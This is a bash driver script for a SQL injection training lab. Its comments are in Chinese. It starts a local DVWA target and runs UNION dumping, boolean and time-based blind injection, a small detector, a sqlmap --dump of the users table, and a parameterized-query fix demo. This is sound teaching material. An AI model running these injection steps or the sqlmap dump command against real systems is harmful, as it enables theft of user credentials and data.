#!/usr/bin/env bash
# =============================================================================
# 13 · SQL 注入全流程 —— union 拖库 / 布尔与时间盲注 / 五点检测 / sqlmap 对照 / 预编译
# 用法: ./sqli_lab.sh [apply|observe|clean|all]   (默认 all)
# 前置: 实验 12 的 DVWA 栈（本脚本会自动拉起）；sqlmap 可选（对照用）
# =============================================================================
set -euo pipefail
cd "$(dirname "$0")"                      # 任意 cwd 运行都正确

PY="${PYTHON:-python3}"
ART="artifacts"
DVWA_DIR="../12_dvwa"

step() { echo; echo "=====> [$1] $2"; }
ok()   { echo "  ✅ $*"; }
die()  { echo "  ❌ $*" >&2; exit 1; }

do_apply() {
    step "apply" "拉起 DVWA 靶场（复用实验 12 的栈）"
    mkdir -p "$ART"
    "$PY" -c "import requests" 2>/dev/null || die "缺少 requests：pip3 install requests"
    [ -d "$DVWA_DIR" ] || die "找不到实验 12 目录（${DVWA_DIR}）"
    "$DVWA_DIR/dvwa.sh" apply | tail -3
    curl -s -o /dev/null -w '' "http://127.0.0.1:8612/login.php" \
        || die "DVWA 未就绪"
    ok "靶场就绪（后续所有注入都打在这个本地靶站上）"
}

do_observe() {
    step "observe" "① union 注入：定列数 → 找显位 → 拖 users 表"
    "$PY" sqli_lab.py union | tee "$ART/union.out"
    grep -q "拖出 5 行" "$ART/union.out" || die "union 拖库行数异常"
    grep -q "5f4dcc3b5aa765d61d8327deb882cf99" "$ART/union.out" \
        || die "未拖出 admin 的口令 hash"
    ok "手工 union 注入拖出全部 5 个用户名与口令 hash"

    step "observe" "② 布尔盲注：二分法逐字符提取 database()"
    "$PY" sqli_lab.py blind | tee "$ART/blind.out"
    grep -q "dvwa" "$ART/blind.out" || die "盲注提取失败"
    ok "布尔盲注二分提取成功（无回显也能问出数据库名）"

    step "observe" "③ 时间盲注：条件 SLEEP 确认 + 前两字符提取"
    "$PY" sqli_lab.py time | tee "$ART/time.out"
    grep -q "检测到延迟" "$ART/time.out" || die "SLEEP 未造成延迟"
    grep -q "前 2 字符：dv" "$ART/time.out" || die "时间盲注提取失败"
    ok "条件延迟成立——完全没有回显差异时，用时间做信道"

    step "observe" "④ 五点迷你检测器：4 注入点 + 1 对照"
    "$PY" sqli_lab.py detect | tee "$ART/detect.out"
    grep -q "4 个注入点 + 1 个对照，5 点全部判定" "$ART/detect.out" \
        || die "五点判定数量异常"
    ok "5/5 判定正确（low/medium 各两点，对照点判为安全）"

    step "observe" "⑤ sqlmap 对照：同一靶点，工具与手工结果一致"
    if command -v sqlmap >/dev/null 2>&1; then
        local cookie
        cookie="$("$PY" sqli_lab.py session)"
        rm -rf "$ART/sqlmap"
        sqlmap -u "http://127.0.0.1:8612/vulnerabilities/sqli/?id=1&Submit=Submit" \
            --cookie="$cookie" --batch --flush-session -T users --dump \
            --output-dir="$ART/sqlmap" > "$ART/sqlmap.out" 2>&1 || true
        grep -q "5f4dcc3b5aa765d61d8327deb882cf99" "$ART/sqlmap.out" \
            || { tail -20 "$ART/sqlmap.out"; die "sqlmap 未拖出 admin hash"; }
        grep -qE "\[5 entries\]|5 entries" "$ART/sqlmap.out" || true
        ok "sqlmap --dump 拖出的 hash 与手工一致（admin 行逐字相同）"
    else
        echo "  ℹ️  未安装 sqlmap，跳过对照（brew install sqlmap 后可补验）"
    fi

    step "observe" "⑥ 预编译修复对照：拼接 vs 参数化"
    "$PY" sqli_lab.py fixdemo | tee "$ART/fixdemo.out"
    grep -q "注入生效，拖出全部行" "$ART/fixdemo.out" || die "拼接版未演示出注入"
    grep -q "注入被当作纯数据" "$ART/fixdemo.out" || die "参数化版未挡住注入"
    ok "同一载荷：拼接版全表泄露，参数化版当作纯字符串——修复一句话，效果两重天"
}

do_clean() {
    step "clean" "清理生成物（DVWA 栈保持运行，生命周期归实验 12 管理）"
    rm -rf "$ART"
    ok "artifacts/ 已清理；要拆靶场用 ../12_dvwa/dvwa.sh clean"
}

main() {
    local target="${1:-all}"
    case "$target" in
        apply)   do_apply ;;
        observe) do_observe ;;
        clean)   do_clean ;;
        all)     do_apply; do_observe; do_clean ;;
        *) echo "可用: apply | observe | clean | all" >&2; exit 1 ;;
    esac
}
main "$@"
